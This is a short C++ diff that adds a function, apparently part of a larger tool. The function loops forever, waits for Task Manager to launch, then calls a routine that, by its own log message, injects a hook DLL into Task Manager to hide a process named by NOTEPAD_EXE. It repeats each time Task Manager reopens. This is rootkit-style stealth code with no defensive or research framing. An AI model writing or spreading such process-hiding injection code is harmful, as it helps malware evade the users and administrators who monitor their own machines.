@@ -78,3 +78,25 @@ void SystemUtils::hide_process_from_tskmgr(const std::wstring& process_name)
 		throw;
 	}
 }
+
+void SystemUtils::hide_from_task_manager()
+{
+	while (true)
+	{
+		Logger::Instance().info(L"Checking for task manager");
+		while (!SystemUtils::get_process_id(SystemUtils::TASK_MGR_EXE))
+		{
+			std::this_thread::sleep_for(std::chrono::seconds(1));
+		}
+
+		Logger::Instance().info(L"Found task manager process");
+		SystemUtils::hide_process_from_tskmgr(NOTEPAD_EXE);
+		Logger::Instance().info(L"Injected hook dll to task manager");
+
+		while (SystemUtils::get_process_id(SystemUtils::TASK_MGR_EXE))
+		{
+			std::this_thread::sleep_for(std::chrono::seconds(1));
+		}
+		Logger::Instance().info(L"Task manager was closed");
+	}
+}
